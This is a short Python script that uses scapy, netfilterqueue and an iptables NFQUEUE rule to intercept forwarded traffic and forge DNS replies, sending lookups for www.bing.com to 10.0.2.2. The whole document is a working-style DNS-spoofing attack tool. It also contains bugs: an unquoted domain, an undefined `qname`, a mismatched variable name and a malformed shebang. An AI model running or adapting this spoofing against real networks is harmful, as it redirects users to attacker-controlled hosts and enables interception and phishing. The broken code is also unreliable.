#!usr/bin/env python
import scapy.all as scapy
import netfilterqueue
import subprocess

subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)


def process_packet(packet):
    scapyPacket = scapy.IP(packet.get_payload())
    if scapyPacket.haslayer(scapy.DNSRR):
        if www.bing.com in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.2")
            scapyPacket[scapy.DNS].an = answer
            scapyPacket[scapy.DNS].ancount = 1

            del scapyPacket[scapy.IP].len
            del scapyPacket[scapy.IP].chksum
            del scapyPacket[scapy.UDP].len
            del scapyPacket[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

    packet.accept()
try:
	queue = netfilterqueue.NetfilterQueue()
	queue.bind(0, process_packet)
	queue.run()
except KeyboardInterrupt:
	print("\n\n[-] Closing...")
	subprocess.call("iptables --flush", shell=True)

